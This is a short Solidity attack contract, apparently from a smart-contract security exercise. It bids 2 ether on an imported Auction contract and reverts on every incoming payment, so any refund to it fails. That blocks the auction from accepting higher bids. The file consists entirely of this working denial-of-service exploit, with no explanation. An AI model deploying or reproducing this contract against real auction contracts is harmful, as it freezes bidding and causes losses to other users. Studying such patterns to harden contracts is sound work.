pragma solidity ^0.8.6; 

import "../src/Auction.sol";

contract Auctionattack {

    Auction public auction;

    constructor(address _auction) {
        auction = Auction(_auction);
    }

    function attack(uint256 _id) public payable {
        auction.bid{value :2 ether}(_id);
    }

    receive() external payable {
        revert ('......');
    }

}